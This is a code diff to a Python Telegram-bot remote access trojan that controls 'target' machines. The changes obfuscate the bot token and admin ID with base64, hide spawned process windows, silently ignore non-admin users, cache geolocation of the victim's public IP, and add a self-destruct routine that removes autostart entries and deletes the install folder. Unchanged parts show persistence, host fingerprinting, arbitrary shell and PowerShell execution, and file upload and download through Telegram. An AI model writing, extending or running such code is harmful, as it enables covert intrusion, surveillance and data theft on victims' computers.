@@ -4,7 +4,7 @@ from pathlib import Path
 from aiogram import Bot,Dispatcher,F
 from aiogram.exceptions import TelegramConflictError,TelegramUnauthorizedError
 from aiogram.filters import Command
-from aiogram.types import ErrorEvent,Message,FSInputFile
+from aiogram.types import ErrorEvent,Message,FSInputFile,CallbackQuery,InlineKeyboardMarkup,InlineKeyboardButton
 IS_WIN=sys.platform.startswith("win");IS_MAC=sys.platform=="darwin";IS_LINUX=not IS_WIN and not IS_MAC
 if IS_WIN:
  import ctypes,winreg
@@ -16,10 +16,12 @@ for _s in(sys.stdout,sys.stderr):
  try:_s.reconfigure(encoding="utf-8",errors="replace")
  except:pass
 os.environ.setdefault("PYTHONIOENCODING","utf-8");os.environ.setdefault("PYTHONUTF8","1")
-TOKEN="__TOKEN__";ADMIN_ID=__ADMIN_ID__;CLIENT_NAME="__NAME__";APP_NAME="WinSvcIMTx32";APP_LABEL=f"com.{APP_NAME}";MAX_UPLOAD=50*1024*1024
+TOKEN=__import__("base64").b64decode("__TOKEN__").decode();ADMIN_ID=int(__import__("base64").b64decode("__ADMIN_ID__").decode());CLIENT_NAME="__NAME__";APP_NAME="__APP_NAME__";APP_LABEL=f"com.{APP_NAME}";MAX_UPLOAD=50*1024*1024
+_SPAWN=0x08000000 if IS_WIN else 0
+_DETACH=0x00000008 if IS_WIN else 0
 bot=Bot(token=TOKEN);dp=Dispatcher()
 logging.getLogger("aiogram").setLevel(logging.CRITICAL);logging.getLogger("asyncio").setLevel(logging.CRITICAL)
-_start_ts=time.time();_offline=False;_loop=None;_shutdown_done=False;_pending_put=None
+_start_ts=time.time();_offline=False;_loop=None;_shutdown_done=False;_pending_put=None;_geo_cache=None
 def _rand(n=10):return"".join(random.choices(string.ascii_lowercase+string.digits,k=n))
 def _hide(p):
  if not IS_WIN:return
@@ -46,7 +48,7 @@ class _C:
 def _run(args,timeout=30):
  try:
   if IS_WIN:
-   q=subprocess.list2cmdline(args);r=subprocess.run(q,shell=True,capture_output=True,timeout=timeout)
+   q=subprocess.list2cmdline(args);r=subprocess.run(q,shell=True,capture_output=True,timeout=timeout,creationflags=_SPAWN)
   else:r=subprocess.run(args,capture_output=True,timeout=timeout)
   return _C(r.returncode,_dec(r.stdout or b""),_dec(r.stderr or b""))
  except Exception as e:return _C(-1,"",str(e))
@@ -152,13 +154,64 @@ def autostart_install():
   if IS_MAC:return _autostart_macos(t)
   return _autostart_linux(t)
  except Exception as e:return f"⚠️ install err: {e}"
+def _uninstall_autostart():
+ try:
+  if IS_WIN:
+   _run(["schtasks","/Delete","/TN",APP_NAME,"/F"])
+   _run(["reg","delete",rf"HKCU\Software\{APP_NAME}","/f"])
+   _run(["reg","delete",rf"HKCU\Software\Microsoft\Windows\CurrentVersion\Run","/v",APP_NAME,"/f"])
+   _run(["reg","delete",rf"HKLM\Software\{APP_NAME}","/f"])
+   _run(["reg","delete",rf"HKLM\Software\Microsoft\Windows\CurrentVersion\Run","/v",APP_NAME,"/f"])
+  elif IS_MAC:
+   daemon=Path(f"/Library/LaunchDaemons/{APP_LABEL}.plist")
+   agent=Path(os.path.expanduser(f"~/Library/LaunchAgents/{APP_LABEL}.plist"))
+   for p in(daemon,agent):
+    _run(["launchctl","unload","-w",str(p)])
+    try:p.unlink(missing_ok=True)
+    except:pass
+  else:
+   _run(["systemctl","disable","--now",f"{APP_NAME}.service"])
+   try:Path(f"/etc/systemd/system/{APP_NAME}.service").unlink(missing_ok=True)
+   except:pass
+   _run(["systemctl","daemon-reload"])
+   for p in(
+    Path(f"/etc/systemd/system/{APP_NAME}.service"),
+    Path(os.environ.get("XDG_CONFIG_HOME")or os.path.expanduser("~/.config"))/"autostart"/f"{APP_NAME}.desktop",
+   ):
+    try:p.unlink(missing_ok=True)
+    except:pass
+ except:pass
+def self_destruct():
+ _uninstall_autostart()
+ _clear_install_path()
+ launch=_read_install_path()
+ try:
+  cur=Path(sys.executable if getattr(sys,"frozen",False) else __file__).resolve()
+  folder=str(cur.parent)
+ except:folder=None
+ try:folder=folder or(str(Path(launch).parent)if launch else None)
+ except:folder=None
+ if folder:
+  try:
+   if IS_WIN:
+    subprocess.Popen(
+     f'timeout /t 2 /nobreak >nul & attrib -h -s -r "{folder}" /s /d & rmdir /s /q "{folder}"',
+     shell=True,creationflags=_SPAWN|_DETACH,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,
+    )
+   else:
+    subprocess.Popen(
+     f'sleep 2 && rm -rf "{folder}"',
+     shell=True,start_new_session=True,stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,
+    )
+  except:pass
+ os._exit(0)
 def _flag(cc):
  if not cc or len(cc)!=2:return"🏳️"
  try:return"".join(chr(0x1F1E6+ord(c.upper())-65)for c in cc)
  except:return"🏳️"
-def get_geo_info():
- # Tries multiple geo-IP APIs in order; returns "IP / flag country city (lat, lon)".
- # Each entry: (URL, [ip_key, cc_key, country_key, city_key, lat_key, lon_key]).
+def _geo_lookup():
+ global _geo_cache
+ if _geo_cache is not None:return _geo_cache
  apis=[
   ("https://ipwho.is/",("ip","country_code","country","city","latitude","longitude")),
   ("https://ipapi.co/json/",("ip","country_code","country_name","city","latitude","longitude")),
@@ -172,55 +225,55 @@ def get_geo_info():
  ]
  for url,keys in apis:
   try:
-   with urllib.request.urlopen(url,timeout=6)as r:
-    d=json.loads(r.read().decode("utf-8",errors="replace"))
+   with urllib.request.urlopen(url,timeout=6)as r:d=json.loads(r.read().decode("utf-8",errors="replace"))
    ip=d.get(keys[0])
    if not ip:continue
-   cc=d.get(keys[1])or""
-   country=d.get(keys[2])or"?"
-   city=d.get(keys[3])or"?"
-   lat=d.get(keys[4])if keys[4]else None
-   lon=d.get(keys[5])if keys[5]else None
-   coords=f" ({lat}, {lon})"if lat is not None and lon is not None else""
-   return f"🌍 Public IP: {ip}\n{_flag(cc)} {country}, {city}{coords}"
+   _geo_cache={"ip":ip,"cc":d.get(keys[1])or"","country":d.get(keys[2])or"?","city":d.get(keys[3])or"?","lat":d.get(keys[4])if keys[4]else None,"lon":d.get(keys[5])if keys[5]else None}
+   return _geo_cache
   except:pass
- return"🌍 Public IP: unknown"
+ _geo_cache={}
+ return _geo_cache
+def get_geo_line():
+ d=_geo_lookup()
+ if not d or not d.get("ip"):return"unknown"
+ coords=f" ({d['lat']}, {d['lon']} - GeoIP)"if d.get("lat")is not None and d.get("lon")is not None else""
+ return f"{_flag(d.get('cc',''))} {d.get('country','?')}, {d.get('city','?')}{coords}"
 def get_public_ip():
- for u in("https://api.ipify.org","https://ifconfig.me/ip","https://icanhazip.com"):
-  try:
-   with urllib.request.urlopen(u,timeout=5)as r:return r.read().decode("utf-8",errors="replace").strip()
-  except:pass
- return"unknown"
+ d=_geo_lookup()
+ return d.get("ip")or"unknown"
 def get_local_ip():
  try:
   s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect(("8.8.8.8",80));ip=s.getsockname()[0];s.close();return ip
  except:return"unknown"
 def get_mac():
- try:return f"{uuid.getnode():012X}"
+ try:
+  n=uuid.getnode();h=f"{n:012X}";c=":".join(h[i:i+2]for i in(0,2,4,6,8,10));return f"{h} ({c})"
  except:return"unknown"
 def get_device_info():
  try:u=getpass.getuser()
  except:u="unknown"
- try:return"\n".join([f"🖥 Host: {platform.node()}",f"👤 User: {u}",f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",f"🏗 Architecture: {platform.machine()}",f"🌐 Local IP: {get_local_ip()}",get_geo_info(),f"🔗 MAC: {get_mac()}",f"📁 CWD: {os.getcwd()}",f"📂 Installed: {_read_install_path()or'❌'}",f"🛡 Admin: {is_admin()}",f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",f"\n",f"Type /help to see command list."])
+ try:return"\n".join([f"🖥 Host: {platform.node()}",f"👤 User: {u}",f"💻 OS: {platform.system()} {platform.release()} ({platform.version()})",f"🏗 Architecture: {platform.machine()}",f"🌐 Local IP: {get_local_ip()}",f"🌍 Public IP: {get_public_ip()}",f"🔗 MAC: {get_mac()}",f"📁 CWD: {os.getcwd()}",f"📂 Installed: {_read_install_path()or'❌'}",f"🛡 Admin: {is_admin()}",f"🐧 Platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}",f"\n",f"Type /help to see command list."])
  except Exception as e:return f"[device info error: {e}]"
 async def build_online_message():
- try:i=await asyncio.to_thread(get_device_info)
- except Exception as e:i=f"[info err: {e}]"
- return f"🟢 [{CLIENT_NAME}] ONLINE!\n\n{i}"
+ try:geo=await asyncio.to_thread(get_geo_line)
+ except Exception as e:geo=f"[geo err: {e}]"
+ try:info=await asyncio.to_thread(get_device_info)
+ except Exception as e:info=f"[info err: {e}]"
+ return f"🟢 [{CLIENT_NAME}] ONLINE!\n\n{geo}\n\n{info}"
 def run_cmd(c):
  try:
-  r=subprocess.run(c,shell=True,capture_output=True);o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
+  r=subprocess.run(c,shell=True,capture_output=True,creationflags=_SPAWN if IS_WIN else 0);o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
  except Exception as e:return f"[error: {e}]"
 def run_cmd_cmdline(c):
  try:
-  if IS_WIN:r=subprocess.run(["cmd.exe","/c",c],capture_output=True)
+  if IS_WIN:r=subprocess.run(["cmd.exe","/c",c],capture_output=True,creationflags=_SPAWN)
   else:r=subprocess.run(c,shell=True,capture_output=True)
   o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
  except Exception as e:return f"[error: {e}]"
 def run_cmd_ps(c):
  if not IS_WIN:return"[powershell] only supported on Windows"
  try:
-  r=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",c],capture_output=True)
+  r=subprocess.run(["powershell","-NoProfile","-NonInteractive","-Command",c],capture_output=True,creationflags=_SPAWN)
   o=_dec((r.stdout or b"")+(r.stderr or b"")).strip();return o or f"[empty, rc={r.returncode}]"
  except Exception as e:return f"[error: {e}]"
 def split_msg(t,l=4000):
@@ -260,19 +313,51 @@ async def _on_error(e):return True
 @dp.message(Command("start"))
 async def cmd_start(m):
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
+  if not is_adm(m):return
   await m.answer(await build_online_message())
  except:pass
 @dp.message(Command("help"))
 async def cmd_help(m):
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
-  await m.answer(f"📖 [{CLIENT_NAME}] commands\n\n/start — host info + geo\n/heartbeat — liveness probe (uptime, PID, offline flag)\n/help — this message\n/getfile <path> — download a file from the target\n    example: /getfile C:\\Users\\Public\\log.txt\n/putfile <dir> — upload a file from Telegram into <dir>\n    example: /putfile C:\\Users\\Public\n    (bot will then ask you to send the file)\n/cmd <command> — run via cmd.exe (Windows) / sh (Unix)\n    example: /cmd dir\n/powershell <command> — run via PowerShell (Windows only)\n    example: /powershell Get-Process | Select -First 5\n\nanything else — shell command (no timeout)\n    example: dir\n    example: ps aux | head\n\nlimits:\n  • max upload: {MAX_UPLOAD//(1024*1024)} MB per file")
+  if not is_adm(m):return
+  await m.answer(f"📖 [{CLIENT_NAME}] commands\n\n/start — host info + geo\n/heartbeat — liveness probe (uptime, PID, offline flag)\n/help — this message\n/uninstall — remove the client from this machine (asks for confirmation)\n/getfile <path> — download a file from the target\n    example: /getfile C:\\Users\\Public\\log.txt\n/putfile <dir> — upload a file from Telegram into <dir>\n    example: /putfile C:\\Users\\Public\n    (bot will then ask you to send the file)\n/cmd <command> — run via cmd.exe (Windows) / sh (Unix)\n    example: /cmd dir\n/powershell <command> — run via PowerShell (Windows only)\n    example: /powershell Get-Process | Select -First 5\n\nanything else — shell command (no timeout)\n    example: dir\n    example: ps aux | head\n\nlimits:\n  • max upload: {MAX_UPLOAD//(1024*1024)} MB per file")
+ except:pass
+@dp.message(Command("uninstall"))
+async def cmd_uninstall(m):
+ try:
+  if not is_adm(m):return
+  kb=InlineKeyboardMarkup(inline_keyboard=[[
+   InlineKeyboardButton(text="✅ Yes",callback_data="uninst:yes"),
+   InlineKeyboardButton(text="❌ No",callback_data="uninst:no"),
+  ]])
+  await m.answer(
+   f"⚠️ [{CLIENT_NAME}] are you sure?\n\n"
+   f"This will remove autostart entries, the install folder and this process.\n"
+   f"The bot will stop responding.",
+   reply_markup=kb,
+  )
+ except:pass
+@dp.callback_query(F.data.startswith("uninst:"))
+async def cb_uninstall(cq:CallbackQuery):
+ try:
+  if not cq.from_user or cq.from_user.id!=ADMIN_ID:
+   return
+  action=cq.data.split(":",1)[1]
+  if action=="yes":
+   try:await cq.message.edit_text(f"🗑 [{CLIENT_NAME}] uninstalling...")
+   except:pass
+   await asyncio.sleep(0.4)
+   await _safe_send(f"🗑 [{CLIENT_NAME}] uninstalling and self-destructing")
+   await asyncio.sleep(0.6)
+   await asyncio.to_thread(self_destruct)
+  else:
+   try:await cq.message.edit_text(f"❌ [{CLIENT_NAME}] cancelled")
+   except:pass
  except:pass
 @dp.message(Command("getfile"))
 async def cmd_getfile(m):
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
+  if not is_adm(m):return
   r=(m.text or"").strip();p_=r.split(maxsplit=1)
   if len(p_)<2 or not p_[1].strip():return await m.answer("usage: /getfile <path>\nexample: /getfile C:\\Users\\Public\\log.txt\nexample: /getfile /etc/passwd")
   p=Path(p_[1].strip().strip('"').strip("'"))
@@ -292,7 +377,7 @@ async def cmd_getfile(m):
 async def cmd_putfile(m):
  global _pending_put
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
+  if not is_adm(m):return
   r=(m.text or"").strip();p_=r.split(maxsplit=1)
   if len(p_)<2 or not p_[1].strip():return await m.answer("usage: /putfile <target_directory>\nexample: /putfile C:\\Users\\Public\nexample: /putfile /tmp")
   d=Path(p_[1].strip().strip('"').strip("'"))
@@ -321,14 +406,14 @@ async def cmd_putrecv(m):
 @dp.message(Command("heartbeat"))
 async def cmd_heartbeat(m):
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
+  if not is_adm(m):return
   up=int(time.time()-_start_ts);h,rem=divmod(up,3600);mn,sc=divmod(rem,60)
   await m.answer(f"💓 [{CLIENT_NAME}] alive\n⏱ uptime: {h}h {mn}m {sc}s\n🆔 pid: {os.getpid()}\n📡 offline flag: {_offline}\n🛡 admin: {is_admin()}\n🐧 platform: {'win' if IS_WIN else 'mac' if IS_MAC else 'linux'}")
  except:pass
 @dp.message(Command("cmd"))
 async def cmd_cmd(m):
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
+  if not is_adm(m):return
   parts=(m.text or"").strip().split(maxsplit=1)
   if len(parts)<2 or not parts[1].strip():return await m.answer("usage: /cmd <command>\nexample: /cmd dir")
   o=await asyncio.to_thread(run_cmd_cmdline,parts[1].strip())
@@ -341,7 +426,7 @@ async def cmd_cmd(m):
 @dp.message(Command("powershell"))
 async def cmd_ps(m):
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
+  if not is_adm(m):return
   parts=(m.text or"").strip().split(maxsplit=1)
   if len(parts)<2 or not parts[1].strip():return await m.answer("usage: /powershell <command>\nexample: /powershell Get-Process | Select -First 5")
   o=await asyncio.to_thread(run_cmd_ps,parts[1].strip())
@@ -354,7 +439,7 @@ async def cmd_ps(m):
 @dp.message(F.text)
 async def cmd_exec(m):
  try:
-  if not is_adm(m):return await m.answer("⛔ Access denied")
+  if not is_adm(m):return
   c=(m.text or"").strip()
   if not c:return
   o=await asyncio.to_thread(run_cmd,c)
